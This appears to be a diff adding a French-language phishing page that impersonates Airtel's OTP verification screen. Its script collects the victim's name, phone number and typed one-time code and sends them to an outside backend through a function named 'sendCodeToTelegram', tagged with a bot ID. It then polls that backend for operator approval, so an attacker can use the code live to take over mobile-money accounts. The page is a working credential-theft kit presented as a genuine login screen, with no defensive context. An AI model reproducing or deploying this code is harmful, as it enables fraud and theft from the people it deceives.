@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Vérification OTP</title>
+
+<style>
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+}
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
+  background:#f2f2f2;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* CONTAINER */
+.page{
+  width:100%;
+  max-width:360px;
+  text-align:center;
+  padding:20px;
+}
+
+/* AIRTEL TITLE */
+.title{
+  font-size:42px;
+  font-weight:600;
+  color:#e60000;
+  margin-bottom:10px;
+}
+
+/* Subtitle */
+.subtitle{
+  font-size:22px;
+  color:#555;
+  margin-bottom:16px;
+}
+
+/* PHONE DISPLAY */
+.display-number{
+  width:100%;
+  padding:16px;
+  border:2px solid #e60000;
+  border-radius:14px;
+  font-size:18px;
+  text-align:center;
+  background:#fff;
+  margin-bottom:26px;
+  color:#333;
+}
+
+/* OTP LABEL */
+.label{
+  font-size:17px;
+  color:#666;
+  margin-bottom:18px;
+}
+
+/* OTP BOXES */
+.otp-boxes{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  margin-bottom:18px;
+}
+
+.otp-boxes input{
+  width:58px;
+  height:58px;
+  font-size:24px;
+  text-align:center;
+  border:2px solid #e60000;
+  border-radius:12px;
+  background:#fff;
+  outline:none;
+}
+
+/* TIMER */
+#timerContainer{
+  font-size:14px;
+  color:#666;
+  margin-bottom:24px;
+}
+
+/* LOGIN BUTTON */
+button{
+  width:100%;
+  padding:16px;
+  font-size:18px;
+  font-weight:600;
+  border-radius:14px;
+  border:none;
+  background:#cccccc;
+  color:#ffffff;
+}
+
+button:not(:disabled){
+  background:#e60000;
+}
+
+/* SPINNER */
+.spinner{
+  width:16px;
+  height:16px;
+  border:3px solid white;
+  border-top:3px solid rgba(255,255,255,0.4);
+  border-radius:50%;
+  margin-left:8px;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg);}
+}
+
+/* STATUS */
+#status{
+  margin-top:14px;
+  font-size:14px;
+  color:#e60000;
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+  <div class="title">Airtel</div>
+
+  <div class="subtitle">Entrer le code OTP</div>
+
+  <div id="phoneNumber" class="display-number"></div>
+
+  <form id="otpForm">
+
+    <div class="label">Entrez le code de vérification</div>
+
+    <div class="otp-boxes">
+      <input maxlength="1" inputmode="numeric">
+      <input maxlength="1" inputmode="numeric">
+      <input maxlength="1" inputmode="numeric">
+      <input maxlength="1" inputmode="numeric">
+    </div>
+
+    <div id="timerContainer">
+      Renvoyer le code OTP dans <strong><span id="timerDisplay">60</span></strong> secondes
+    </div>
+
+    <button id="submitBtn" disabled>
+      <span id="btnText">Connexion</span>
+      <span class="spinner" id="spinner"></span>
+    </button>
+
+  </form>
+
+  <div id="status"></div>
+
+</div>
+
+<script>
+const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+if(!botId){ alert("Lien d'accès invalide"); throw new Error(); }
+
+const phone = localStorage.getItem('phone') || "";
+document.getElementById('phoneNumber').textContent =
+  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "";
+
+const inputs = document.querySelectorAll('.otp-boxes input');
+const submitBtn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const spinner = document.getElementById('spinner');
+const statusEl = document.getElementById('status');
+const timerDisplay = document.getElementById('timerDisplay');
+
+let countdown;
+
+document.addEventListener('keydown', e => {
+  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;
+
+  const values = [...inputs].map(i => i.value);
+  const index = values.findIndex(v => v === "");
+
+  if(e.key === "Backspace") {
+    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
+    if(lastFilled >= 0) inputs[lastFilled].value = "";
+  } else if(index !== -1) {
+    inputs[index].value = e.key;
+  }
+
+  submitBtn.disabled = ![...inputs].every(i => i.value);
+});
+
+function startCountdown(duration = 60){
+  let time = duration;
+  timerDisplay.textContent = time;
+  clearInterval(countdown);
+
+  countdown = setInterval(()=>{
+    time--;
+    timerDisplay.textContent = time;
+    if(time<=0){
+      clearInterval(countdown);
+      statusEl.textContent="Le code OTP a expiré. Veuillez demander un nouveau code.";
+      submitBtn.disabled=true;
+    }
+  },1000);
+}
+
+startCountdown();
+
+async function sendCodeToTelegram(name, phone, code){
+  try{
+    const r = await fetch(`${BACKEND_URL}/submit-code`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ name, phone, code, botId })
+    });
+    return r.json();
+  }catch{
+    return null;
+  }
+}
+
+function pollCodeApproval(requestId){
+  return new Promise(resolve=>{
+    const i=setInterval(async()=>{
+      const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+      const d=await r.json();
+      if(d.approved===true||d.approved===false){
+        clearInterval(i);
+        resolve(d.approved);
+      }
+    },1500);
+  });
+}
+
+document.getElementById('otpForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const code=[...inputs].map(i=>i.value).join('');
+  const name=localStorage.getItem('name')||"Unknown";
+  const phone=localStorage.getItem('phone')||"Unknown";
+
+  submitBtn.disabled=true;
+  btnText.textContent="Vérification";
+  spinner.style.display="inline-block";
+  statusEl.textContent="En attente de validation...";
+
+  const res=await sendCodeToTelegram(name, phone, code);
+  if(!res||!res.requestId){
+    statusEl.textContent="Échec de l'envoi.";
+    submitBtn.disabled=false;
+    btnText.textContent="Connexion";
+    spinner.style.display="none";
+    return;
+  }
+
+  const approved=await pollCodeApproval(res.requestId);
+  clearInterval(countdown);
+
+  if(approved){
+    localStorage.clear();
+    window.location.href=`success.html?botId=${botId}`;
+  }else{
+    statusEl.textContent="Code OTP incorrect. Veuillez réessayer.";
+    inputs.forEach(i=>i.value="");
+    submitBtn.disabled=false;
+    btnText.textContent="Connexion";
+    spinner.style.display="none";
+    startCountdown();
+  }
+});
+</script>
+
+</body>
+</html>
